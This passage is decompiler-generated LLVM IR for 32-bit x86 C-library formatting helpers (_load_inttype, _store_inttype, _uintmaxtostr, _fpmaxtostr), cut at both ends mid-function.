  br i1 %v1_80550c8, label %dec_label_pc_80550d0, label %dec_label_pc_80550ca

dec_label_pc_80550ca:                             ; preds = %dec_label_pc_80550bc
  %v1_80550ca = add i32 %v0_80550c2, 12
  %v2_80550ca = inttoptr i32 %v1_80550ca to i32*
  %v3_80550ca = load i32, i32* %v2_80550ca, align 4
  store i32 %v3_80550ca, i32* %eax.global-to-local, align 4
  %v2_80550cd = add i32 %v0_80550c2, 28
  %v3_80550cd = inttoptr i32 %v2_80550cd to i32*
  store i32 %v3_80550ca, i32* %v3_80550cd, align 4
  %v0_80550d0.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80550d0

dec_label_pc_80550d0:                             ; preds = %dec_label_pc_80550bc, %dec_label_pc_805506d, %dec_label_pc_80550ca
  %v0_80550d0 = phi i32 [ 0, %dec_label_pc_80550bc ], [ -1, %dec_label_pc_805506d ], [ %v0_80550d0.pre, %dec_label_pc_80550ca ]
  store i32 %v0_80550d0, i32* %eax.global-to-local, align 4
  %v2_80550d2 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80550d2, i32* %edx.global-to-local, align 4
  store i32 %v0_8055038, i32* @ebx, align 4
  ret i32 %v0_80550d0

; uselistorder directives
  uselistorder i32 %v0_80550d0, { 1, 0 }
  uselistorder i32 %v0_80550c2, { 1, 0, 2 }
  uselistorder i32 %tmp18, { 1, 0 }
  uselistorder i32 %v1_805508d, { 1, 0, 2 }
  uselistorder i32 %v0_805509f, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v1_8055046, { 1, 0 }
  uselistorder i32 %v2_8055044, { 1, 2, 0, 3 }
  uselistorder i32 %v0_8055038, { 1, 0 }
  uselistorder i32 1024, { 0, 13, 3, 9, 7, 14, 4, 1, 2, 11, 5, 10, 6, 12, 8 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80550d0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80550bc, { 1, 0 }
  uselistorder label %dec_label_pc_805505a, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %v5_80550e0 = icmp slt i32 %tmp, 0
  %v3_8055109 = and i32 %tmp5, 2048
  %v4_8055109 = icmp eq i32 %v3_8055109, 0
  br i1 %v5_80550e0, label %dec_label_pc_8055109, label %dec_label_pc_80550e7

dec_label_pc_80550e7:                             ; preds = %entry
  %v1_80550ea = icmp eq i1 %v4_8055109, false
  br i1 %v1_80550ea, label %dec_label_pc_805510e, label %dec_label_pc_80550ec

dec_label_pc_80550ec:                             ; preds = %dec_label_pc_80550e7
  %v1_80550ec = inttoptr i32 %tmp4 to i32*
  %v2_80550ec = load i32, i32* %v1_80550ec, align 4
  %v6_80550ee = icmp eq i32 %tmp5, 256
  %v1_80550f4 = icmp eq i1 %v6_80550ee, false
  br i1 %v1_80550f4, label %dec_label_pc_80550fb, label %dec_label_pc_80550f6

dec_label_pc_80550f6:                             ; preds = %dec_label_pc_80550ec
  %v1_80550f6 = urem i32 %v2_80550ec, 256
  br label %dec_label_pc_8055106

dec_label_pc_80550fb:                             ; preds = %dec_label_pc_80550ec
  %v6_80550fb = icmp eq i32 %tmp5, 512
  %v1_8055101 = icmp eq i1 %v6_80550fb, false
  br i1 %v1_8055101, label %dec_label_pc_8055106, label %dec_label_pc_8055103

dec_label_pc_8055103:                             ; preds = %dec_label_pc_80550fb
  %v1_8055103 = urem i32 %v2_80550ec, 65536
  br label %dec_label_pc_8055106

dec_label_pc_8055106:                             ; preds = %dec_label_pc_80550fb, %dec_label_pc_80550f6, %dec_label_pc_8055103
  %v0_8055108 = phi i32 [ %v2_80550ec, %dec_label_pc_80550fb ], [ %v1_80550f6, %dec_label_pc_80550f6 ], [ %v1_8055103, %dec_label_pc_8055103 ]
  store i32 0, i32* @edx, align 4
  ret i32 %v0_8055108

dec_label_pc_8055109:                             ; preds = %entry
  br i1 %v4_8055109, label %dec_label_pc_8055114, label %dec_label_pc_805510e

dec_label_pc_805510e:                             ; preds = %dec_label_pc_8055109, %dec_label_pc_80550e7
  %v1_805510e = add i32 %tmp4, 4
  %v2_805510e = inttoptr i32 %v1_805510e to i32*
  %v3_805510e = load i32, i32* %v2_805510e, align 4
  store i32 %v3_805510e, i32* @edx, align 4
  %v1_8055111 = inttoptr i32 %tmp4 to i32*
  %v2_8055111 = load i32, i32* %v1_8055111, align 4
  ret i32 %v2_8055111

dec_label_pc_8055114:                             ; preds = %dec_label_pc_8055109
  %v1_8055114 = inttoptr i32 %tmp4 to i32*
  %v2_8055114 = load i32, i32* %v1_8055114, align 4
  %v6_8055116 = icmp eq i32 %tmp5, 256
  %v1_805511c = icmp eq i1 %v6_8055116, false
  br i1 %v1_805511c, label %dec_label_pc_8055123, label %dec_label_pc_805511e

dec_label_pc_805511e:                             ; preds = %dec_label_pc_8055114
  %v1_805511e = mul i32 %v2_8055114, 16777216
  %v2_805511e = sdiv i32 %v1_805511e, 16777216
  br label %dec_label_pc_805512c

dec_label_pc_8055123:                             ; preds = %dec_label_pc_8055114
  %v6_8055123 = icmp eq i32 %tmp5, 512
  %v1_8055129 = icmp eq i1 %v6_8055123, false
  br i1 %v1_8055129, label %dec_label_pc_805512c, label %dec_label_pc_805512b

dec_label_pc_805512b:                             ; preds = %dec_label_pc_8055123
  %v1_805512b = mul i32 %v2_8055114, 65536
  %v2_805512b = sdiv i32 %v1_805512b, 65536
  br label %dec_label_pc_805512c

dec_label_pc_805512c:                             ; preds = %dec_label_pc_8055123, %dec_label_pc_805511e, %dec_label_pc_805512b
  %v0_805512c = phi i32 [ %v2_8055114, %dec_label_pc_8055123 ], [ %v2_805511e, %dec_label_pc_805511e ], [ %v2_805512b, %dec_label_pc_805512b ]
  %v1_805512c = ashr i32 %v0_805512c, 31
  store i32 %v1_805512c, i32* @edx, align 4
  ret i32 %v0_805512c

; uselistorder directives
  uselistorder i32 %v0_805512c, { 1, 0 }
  uselistorder i32 %v2_8055114, { 2, 0, 1 }
  uselistorder i32 %v2_80550ec, { 2, 0, 1 }
  uselistorder i32 %tmp4, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_805512c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055106, { 2, 0, 1 }
}

define i32 @_store_inttype() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i16* @__decompiler_undefined_function_6()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8055130 = load i32, i32* @ebx, align 4
  store i32 %v0_8055130, i32* %stack_var_-4, align 4
  store i32 %tmp6, i32* @ecx, align 4
  %v4_8055135 = ptrtoint i16* %tmp5 to i32
  store i32 %v4_8055135, i32* %ebx.global-to-local, align 4
  %v4_8055139 = trunc i32 %tmp4 to i16
  %v6_8055141 = icmp eq i32 %tmp6, 256
  %v1_8055147 = icmp eq i1 %v6_8055141, false
  br i1 %v1_8055147, label %dec_label_pc_805514d, label %dec_label_pc_8055149

dec_label_pc_8055149:                             ; preds = %entry
  %v2_8055149 = trunc i32 %tmp4 to i8
  %v4_8055149 = bitcast i16* %tmp5 to i8*
  store i8 %v2_8055149, i8* %v4_8055149, align 1
  br label %dec_label_pc_805516b

dec_label_pc_805514d:                             ; preds = %entry
  %v6_805514d = icmp eq i32 %tmp6, 2048
  %v1_8055153 = icmp eq i1 %v6_805514d, false
  br i1 %v1_8055153, label %dec_label_pc_805515c, label %dec_label_pc_8055155

dec_label_pc_8055155:                             ; preds = %dec_label_pc_805514d
  %sext2 = mul i32 %tmp4, 65536
  %v1_8055155 = sdiv i32 %sext2, 65536
  %v3_8055155 = bitcast i16* %tmp5 to i32*
  store i32 %v1_8055155, i32* %v3_8055155, align 4
  %v0_8055157 = load i32, i32* %edx.global-to-local, align 4
  %v1_8055157 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8055157 = add i32 %v1_8055157, 4
  %v3_8055157 = inttoptr i32 %v2_8055157 to i32*
  store i32 %v0_8055157, i32* %v3_8055157, align 4
  br label %dec_label_pc_805516b

dec_label_pc_805515c:                             ; preds = %dec_label_pc_805514d
  %v6_805515c = icmp eq i32 %tmp6, 512
  %v1_8055162 = icmp eq i1 %v6_805515c, false
  br i1 %v1_8055162, label %dec_label_pc_8055169, label %dec_label_pc_8055164

dec_label_pc_8055164:                             ; preds = %dec_label_pc_805515c
  store i16 %v4_8055139, i16* %tmp5, align 2
  br label %dec_label_pc_805516b

dec_label_pc_8055169:                             ; preds = %dec_label_pc_805515c
  %sext3 = mul i32 %tmp4, 65536
  %v1_8055169 = sdiv i32 %sext3, 65536
  %v3_8055169 = bitcast i16* %tmp5 to i32*
  store i32 %v1_8055169, i32* %v3_8055169, align 4
  br label %dec_label_pc_805516b

dec_label_pc_805516b:                             ; preds = %dec_label_pc_8055164, %dec_label_pc_8055155, %dec_label_pc_8055149, %dec_label_pc_8055169
  %v2_805516b = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805516b, i32* %ebx.global-to-local, align 4
  %sext = mul i32 %tmp4, 65536
  %v1_805516c = sdiv i32 %sext, 65536
  ret i32 %v1_805516c

; uselistorder directives
  uselistorder label %dec_label_pc_805516b, { 3, 0, 1, 2 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v4_805517b = ptrtoint i8* %arg1 to i32
  store i32 %v4_805517b, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* %ecx.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %v2_8055187 = icmp slt i32 %arg4, 0
  %v1_8055189 = icmp eq i1 %v2_8055187, false
  br i1 %v1_8055189, label %dec_label_pc_80551aa, label %dec_label_pc_805518b

dec_label_pc_805518b:                             ; preds = %entry
  %v1_805518b = sub i32 0, %arg4
  store i32 %v1_805518b, i32* %esi.global-to-local, align 4
  %v2_805518d = icmp slt i32 %arg3, 0
  %v1_805518f = icmp eq i1 %v2_805518d, false
  br i1 %v1_805518f, label %dec_label_pc_80551aa, label %dec_label_pc_8055191

dec_label_pc_8055191:                             ; preds = %dec_label_pc_805518b
  %v1_8055191 = sub i32 0, %arg2
  %v5_8055191 = icmp ne i32 %arg2, 0
  store i32 %v1_8055191, i32* %ecx.global-to-local, align 4
  %v2_8055193 = zext i1 %v5_8055191 to i32
  %v3_8055193 = add i32 %v2_8055193, %arg3
  %v1_805519e = sub i32 0, %v3_8055193
  store i32 %v1_805519e, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80551aa

dec_label_pc_80551aa:                             ; preds = %entry, %dec_label_pc_805518b, %dec_label_pc_8055191
  %v0_80551af = phi i32 [ %v1_805518b, %dec_label_pc_8055191 ], [ %v1_805518b, %dec_label_pc_805518b ], [ %arg4, %entry ]
  %stack_var_-28.0 = phi i32 [ 1, %dec_label_pc_8055191 ], [ 0, %dec_label_pc_805518b ], [ 0, %entry ]
  %div = udiv i32 -1, %v0_80551af
  %tmp36 = urem i32 -1, %v0_80551af
  %v1_80551b1 = add i32 %tmp36, 1
  store i8 0, i8* %arg1, align 1
  %v1_80551b5 = load i32, i32* %esi.global-to-local, align 4
  %v12_80551b5 = icmp eq i32 %v1_80551b1, %v1_80551b5
  %v1_80551bf = icmp eq i1 %v12_80551b5, false
  br i1 %v1_80551bf, label %dec_label_pc_80551ce, label %dec_label_pc_80551c1

dec_label_pc_80551c1:                             ; preds = %dec_label_pc_80551aa
  %v1_80551c1 = add i32 %div, 1
  br label %dec_label_pc_80551ce

dec_label_pc_80551ce:                             ; preds = %dec_label_pc_80551aa, %dec_label_pc_80551c1
  %stack_var_-20.0.off0 = phi i32 [ %v1_80551b1, %dec_label_pc_80551aa ], [ 0, %dec_label_pc_80551c1 ]
  %stack_var_-24.0.in = phi i32 [ %div, %dec_label_pc_80551aa ], [ %v1_80551c1, %dec_label_pc_80551c1 ]
  %v0_80551ce = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_80551ce, i32* %ebp.global-to-local, align 4
  %v0_80551d0 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_80551d0, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80551d6

dec_label_pc_80551d6:                             ; preds = %dec_label_pc_8055215, %dec_label_pc_80551ce
  %v0_805520d = phi i32 [ %v0_8055226, %dec_label_pc_8055215 ], [ %v0_80551ce, %dec_label_pc_80551ce ]
  %v0_80551da = phi i32 [ %v1_8055228, %dec_label_pc_8055215 ], [ %v0_80551d0, %dec_label_pc_80551ce ]
  %v1_80551d6 = icmp eq i32 %v0_80551da, 0
  br i1 %v1_80551d6, label %dec_label_pc_805520d, label %dec_label_pc_80551da

dec_label_pc_80551da:                             ; preds = %dec_label_pc_80551d6
  %v0_80551de = load i32, i32* %esi.global-to-local, align 4
  %div8 = udiv i32 %v0_80551da, %v0_80551de
  %tmp37 = urem i32 %v0_80551da, %v0_80551de
  store i32 %div8, i32* %ebx.global-to-local, align 4
  %div9 = udiv i32 %v0_805520d, %v0_80551de
  %tmp38 = urem i32 %v0_805520d, %v0_80551de
  store i32 %div9, i32* %ebp.global-to-local, align 4
  %v6_80551f1 = mul i32 %tmp37, %stack_var_-20.0.off0
  %v2_80551f5 = add i32 %tmp38, %v6_80551f1
  %v8_80551fb = mul i32 %tmp37, %stack_var_-24.0.in
  %v2_8055200 = add i32 %div9, %v8_80551fb
  store i32 %v2_8055200, i32* %ecx.global-to-local, align 4
  %div10 = udiv i32 %v2_80551f5, %v0_80551de
  %tmp39 = urem i32 %v2_80551f5, %v0_80551de
  %v2_8055208 = add i32 %div10, %v2_8055200
  br label %dec_label_pc_8055215

dec_label_pc_805520d:                             ; preds = %dec_label_pc_80551d6
  %v0_8055211 = load i32, i32* %esi.global-to-local, align 4
  %div13 = udiv i32 %v0_805520d, %v0_8055211
  %tmp40 = urem i32 %v0_805520d, %v0_8055211
  br label %dec_label_pc_8055215

dec_label_pc_8055215:                             ; preds = %dec_label_pc_80551da, %dec_label_pc_805520d
  %v0_805521b = phi i32 [ %tmp39, %dec_label_pc_80551da ], [ %tmp40, %dec_label_pc_805520d ]
  %storemerge = phi i32 [ %v2_8055208, %dec_label_pc_80551da ], [ %div13, %dec_label_pc_805520d ]
  store i32 %storemerge, i32* %ebp.global-to-local, align 4
  %v0_8055215 = load i32, i32* %edi.global-to-local, align 4
  %v1_8055215 = add i32 %v0_8055215, -1
  store i32 %v1_8055215, i32* %edi.global-to-local, align 4
  %tmp41 = icmp ult i32 %v0_805521b, 10
  %storemerge15.in.v = select i1 %tmp41, i32 48, i32 %arg5
  %storemerge15.in = add i32 %storemerge15.in.v, %v0_805521b
  %v8_805521b = trunc i32 %storemerge15.in to i8
  %v3_8055224 = inttoptr i32 %v1_8055215 to i8*
  store i8 %v8_805521b, i8* %v3_8055224, align 1
  %v0_8055226 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8055228 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8055228 = or i32 %v1_8055228, %v0_8055226
  %v3_8055228 = icmp eq i32 %v2_8055228, 0
  %v1_805522a = icmp eq i1 %v3_8055228, false
  br i1 %v1_805522a, label %dec_label_pc_80551d6, label %dec_label_pc_805522c

dec_label_pc_805522c:                             ; preds = %dec_label_pc_8055215
  %v4_805522c = icmp eq i32 %stack_var_-28.0, 0
  br i1 %v4_805522c, label %dec_label_pc_8055237, label %dec_label_pc_8055233

dec_label_pc_8055233:                             ; preds = %dec_label_pc_805522c
  %v0_8055233 = load i32, i32* %edi.global-to-local, align 4
  %v1_8055233 = add i32 %v0_8055233, -1
  store i32 %v1_8055233, i32* %edi.global-to-local, align 4
  %v1_8055234 = inttoptr i32 %v1_8055233 to i8*
  store i8 45, i8* %v1_8055234, align 1
  br label %dec_label_pc_8055237

dec_label_pc_8055237:                             ; preds = %dec_label_pc_805522c, %dec_label_pc_8055233
  %v0_805523a = load i32, i32* %edi.global-to-local, align 4
  ret i32 %v0_805523a

; uselistorder directives
  uselistorder i32 %v2_80551f5, { 1, 0 }
  uselistorder i32 %v0_80551de, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 %v0_80551da, { 1, 0, 2 }
  uselistorder i32 %v0_805520d, { 1, 0, 3, 2 }
  uselistorder i32 %v0_80551af, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %edi.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 3, 1, 4 }
  uselistorder i8 45, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8055237, { 1, 0 }
  uselistorder label %dec_label_pc_8055215, { 1, 0 }
  uselistorder label %dec_label_pc_80551ce, { 1, 0 }
  uselistorder label %dec_label_pc_80551aa, { 2, 1, 0 }
}

define i32 @_fpmaxtostr() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %fpu_stat_TOP.global-to-local = alloca i3, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %st1.global-to-local = alloca x86_fp80, align 4
  store i3 0, i3* %fpu_stat_TOP.global-to-local, align 1
  %tmp103 = call i16 @__decompiler_undefined_function_5()
  %tmp112 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-22 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-49 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-70 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8055245 = load i32, i32* @edi, align 4
  %v0_8055246 = load i32, i32* @esi, align 4
  %v0_8055247 = load i32, i32* @ebx, align 4
  store i32 %v0_8055247, i32* %stack_var_-16, align 4
  store i32 %tmp112, i32* %eax.global-to-local, align 4
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v4_805525c = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v5_805525c = add i3 %v4_805525c, -1
  store i3 %v5_805525c, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_8055263 = add i32 %tmp112, 4
  %v2_8055263 = inttoptr i32 %v1_8055263 to i32*
  %v3_8055263 = load i32, i32* %v2_8055263, align 4
  store i32 %v3_8055263, i32* %eax.global-to-local, align 4
  %v1_805526a = add i32 %tmp112, 8
  %v2_805526a = inttoptr i32 %v1_805526a to i8*
  %v3_805526a = load i8, i8* %v2_805526a, align 1
  %v4_805526a = zext i8 %v3_805526a to i32
  %v5_805526a = load i32, i32* @ecx, align 4
  %v6_805526a = and i32 %v5_805526a, -256
  %v7_805526a = or i32 %v6_805526a, %v4_805526a
  store i32 %v7_805526a, i32* %ecx.global-to-local, align 4
  %v1_805526d = inttoptr i32 %tmp112 to i32*
  %v2_805526d = load i32, i32* %v1_805526d, align 4
  store i32 %v2_805526d, i32* %ebp.global-to-local, align 4
  %v3_805526f = and i32 %v3_8055263, -256
  %v4_805526f = or i32 %v3_805526f, %v4_805526a
  %v1_8055275 = or i32 %v4_805526f, 32
  %v3_8055275 = trunc i32 %v1_8055275 to i8
  store i32 %v1_8055275, i32* %eax.global-to-local, align 4
  %v10_8055280 = icmp eq i8 %v3_8055275, 97
  %v1_8055282 = icmp eq i1 %v10_8055280, false
  br i1 %v1_8055282, label %dec_label_pc_805528b, label %dec_label_pc_8055284

dec_label_pc_8055284:                             ; preds = %entry
  %v1_8055284 = add i32 %v7_805526a, 6
  %v11_8055284 = trunc i32 %v1_8055284 to i8
  store i32 %v1_8055284, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805528b

dec_label_pc_805528b:                             ; preds = %entry, %dec_label_pc_8055284
  %stack_var_-206.0 = phi i8 [ %v3_805526a, %entry ], [ %v11_8055284, %dec_label_pc_8055284 ]
  %v2_805528b = icmp slt i32 %v2_805526d, 0
  %v1_805528d = icmp eq i1 %v2_805528b, false
  br i1 %v1_805528d, label %dec_label_pc_8055294, label %dec_label_pc_805528f

dec_label_pc_805528f:                             ; preds = %dec_label_pc_805528b
  store i32 6, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8055294

dec_label_pc_8055294:                             ; preds = %dec_label_pc_805528b, %dec_label_pc_805528f
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v1_80552a3 = add i32 %tmp112, 12
  %v2_80552a3 = inttoptr i32 %v1_80552a3 to i32*
  %v3_80552a3 = load i32, i32* %v2_80552a3, align 4
  store i32 %v3_80552a3, i32* %eax.global-to-local, align 4
  %v2_80552a6 = and i32 %v3_80552a3, 2
  %v3_80552a6 = icmp eq i32 %v2_80552a6, 0
  br i1 %v3_80552a6, label %dec_label_pc_80552b4, label %dec_label_pc_80552c0

dec_label_pc_80552b4:                             ; preds = %dec_label_pc_8055294
  %v2_80552b4 = urem i32 %v3_80552a3, 2
  %tmp143 = trunc i32 %v2_80552b4 to i8
  %tmp = sub nsw i8 0, %tmp143
  %tmp144 = and i8 %tmp, 32
  br label %dec_label_pc_80552c0

dec_label_pc_80552c0:                             ; preds = %dec_label_pc_80552b4, %dec_label_pc_8055294
  %stack_var_-26.0 = phi i8 [ 32, %dec_label_pc_8055294 ], [ %tmp144, %dec_label_pc_80552b4 ]
  %v1_80552d4 = udiv i32 %v3_80552a3, 256
  %tmp146 = and i32 %v1_80552d4, 68
  %tmp147 = icmp eq i32 %tmp146, 64
  br i1 %tmp147, label %dec_label_pc_8055426, label %dec_label_pc_8055346

dec_label_pc_8055346:                             ; preds = %dec_label_pc_80552c0
  store i3 %v4_805525c, i3* %fpu_stat_TOP.global-to-local, align 1
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v1_805534d = add i32 %tmp112, 16
  %v2_805534d = inttoptr i32 %v1_805534d to i32*
  store i32 32, i32* %v2_805534d, align 4
  store i32 3, i32* %stack_var_-152, align 4
  %v4_8055364 = add i8 %stack_var_-206.0, -96
  %v6_8055364 = sub i8 95, %stack_var_-206.0
  %v7_8055364 = and i8 %v6_8055364, %stack_var_-206.0
  %v8_8055364 = icmp slt i8 %v7_8055364, 0
  %v9_8055364 = icmp eq i8 %v4_8055364, 0
  %v10_8055364 = icmp slt i8 %v4_8055364, 0
  %v3_8055369 = icmp eq i1 %v10_8055364, %v8_8055364
  %v4_8055369 = icmp eq i1 %v9_8055364, false
  %v5_8055369 = and i1 %v4_8055369, %v3_8055369
  br i1 %v5_8055369, label %dec_label_pc_8055370, label %dec_label_pc_805536b

dec_label_pc_805536b:                             ; preds = %dec_label_pc_8055346
  br label %dec_label_pc_8055370

dec_label_pc_8055370:                             ; preds = %dec_label_pc_8055346, %dec_label_pc_805536b
  %v2_8055378 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8055378, i32* @ecx, align 4
  br label %dec_label_pc_805574b

dec_label_pc_8055426:                             ; preds = %dec_label_pc_80552c0
  %v1_80552e5 = add i3 %v4_805525c, -2
  store x86_fp80 0xK3FFF8000000000000000, x86_fp80* %st0.global-to-local, align 4
  %v6_805542a = and i32 %v3_80552a3, -65536
  %v2_805542f = ptrtoint i32* %stack_var_-70 to i32
  store i32 %v2_805542f, i32* %edx.global-to-local, align 4
  %v1_8055436 = udiv i16 %tmp103, 256
  %v2_8055436 = zext i16 %v1_8055436 to i32
  %v3_8055436 = mul nuw nsw i32 %v2_8055436, 256
  %tmp148 = urem i16 %tmp103, 256
  %v4_805542a.masked = zext i16 %tmp148 to i32
  %v11_8055436 = or i32 %v4_805542a.masked, %v3_8055436
  %v10_8055436 = or i32 %v11_8055436, %v6_805542a
  %v12_8055436 = or i32 %v10_8055436, 3072
  store i32 %v12_8055436, i32* %eax.global-to-local, align 4
  store i32 0, i32* @edi, align 4
  store x86_fp80 0xK401CEE6B280000000000, x86_fp80* %st1.global-to-local, align 4
  store i3 %v1_80552e5, i3* %fpu_stat_TOP.global-to-local, align 1
  br label %dec_label_pc_805544a

dec_label_pc_805544a:                             ; preds = %dec_label_pc_805549b.dec_label_pc_805544a_crit_edge, %dec_label_pc_8055426
  %v2_8055467 = phi x86_fp80 [ 0xK3FFF8000000000000000, %dec_label_pc_8055426 ], [ %v2_8055467.pre, %dec_label_pc_805549b.dec_label_pc_805544a_crit_edge ]
  %v1_805544a = phi i3 [ %v1_80552e5, %dec_label_pc_8055426 ], [ %v1_805544a.pre, %dec_label_pc_805549b.dec_label_pc_805544a_crit_edge ]
  %v3_8055471 = phi x86_fp80 [ 0xK401CEE6B280000000000, %dec_label_pc_8055426 ], [ %v0_805544a.pre, %dec_label_pc_805549b.dec_label_pc_805544a_crit_edge ]
  %stack_var_-212.0 = phi i32 [ %v2_805542f, %dec_label_pc_8055426 ], [ %v4_805546c, %dec_label_pc_805549b.dec_label_pc_805544a_crit_edge ]
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %tmp149 = fptosi x86_fp80 %v3_8055471 to i32
  store i32 %tmp149, i32* %eax.global-to-local, align 4
  store i32 %tmp149, i32* %ebx.global-to-local, align 4
  %v5_8055464 = sitofp i32 %tmp149 to x86_fp80
  %v4_8055467 = fsub x86_fp80 %v2_8055467, %v5_8055464
  store i3 %v1_805544a, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_805546c = add i32 %stack_var_-212.0, 9
  %v4_8055471 = fmul x86_fp80 %v3_8055471, %v4_8055467
  store x86_fp80 %v4_8055471, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_8055473

dec_label_pc_8055473:                             ; preds = %dec_label_pc_8055473.dec_label_pc_8055473_crit_edge, %dec_label_pc_805544a
  %v0_8055485 = phi i32 [ %v0_8055485.pre, %dec_label_pc_8055473.dec_label_pc_8055473_crit_edge ], [ %tmp149, %dec_label_pc_805544a ]
  %v0_8055473 = phi i32 [ %v0_8055473.pre, %dec_label_pc_8055473.dec_label_pc_8055473_crit_edge ], [ 0, %dec_label_pc_805544a ]
  %v1_8055473 = add i32 %v0_8055473, 1
  store i32 %v1_8055473, i32* %esi.global-to-local, align 4
  %v2_8055478 = sub i32 %v4_805546c, %v1_8055473
  store i32 10, i32* %ecx.global-to-local, align 4
  %div = udiv i32 %v0_8055485, 10
  %tmp136 = urem i32 %v0_8055485, 10
  store i32 %div, i32* %ebx.global-to-local, align 4
  store i32 %v2_8055478, i32* %eax.global-to-local, align 4
  %v1_8055491 = or i32 %tmp136, 48
  %v8_8055491 = trunc i32 %v1_8055491 to i8
  store i32 %v1_8055491, i32* %edx.global-to-local, align 4
  %v3_8055497 = inttoptr i32 %v2_8055478 to i8*
  store i8 %v8_8055491, i8* %v3_8055497, align 1
  %v7_8055499 = icmp sgt i32 %v1_8055473, 8
  br i1 %v7_8055499, label %dec_label_pc_805549b, label %dec_label_pc_8055473.dec_label_pc_8055473_crit_edge

dec_label_pc_8055473.dec_label_pc_8055473_crit_edge: ; preds = %dec_label_pc_8055473
  %v0_8055473.pre = load i32, i32* %esi.global-to-local, align 4
  %v0_8055485.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055473

dec_label_pc_805549b:                             ; preds = %dec_label_pc_8055473
  %v0_805549b = load i32, i32* @edi, align 4
  %v1_805549b = add i32 %v0_805549b, 1
  store i32 %v1_805549b, i32* @edi, align 4
  %v7_805549f = icmp sgt i32 %v1_805549b, 2
  br i1 %v7_805549f, label %dec_label_pc_80554a1, label %dec_label_pc_805549b.dec_label_pc_805544a_crit_edge

dec_label_pc_805549b.dec_label_pc_805544a_crit_edge: ; preds = %dec_label_pc_805549b
  %v0_805544a.pre = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  %v1_805544a.pre = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v2_8055467.pre = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_805544a

dec_label_pc_80554a1:                             ; preds = %dec_label_pc_805549b
  %v0_80554a1 = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_80554a1 = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 %v1_80554a1, x86_fp80* %st0.global-to-local, align 4
  %v2_80554a3 = add i3 %v0_80554a1, 2
  store i3 %v2_80554a3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_80554a5 = add i8 %stack_var_-206.0, -96
  %v6_80554a5 = sub i8 95, %stack_var_-206.0
  %v7_80554a5 = and i8 %v6_80554a5, %stack_var_-206.0
  %v8_80554a5 = icmp slt i8 %v7_80554a5, 0
  %v9_80554a5 = icmp eq i8 %v4_80554a5, 0
  %v10_80554a5 = icmp slt i8 %v4_80554a5, 0
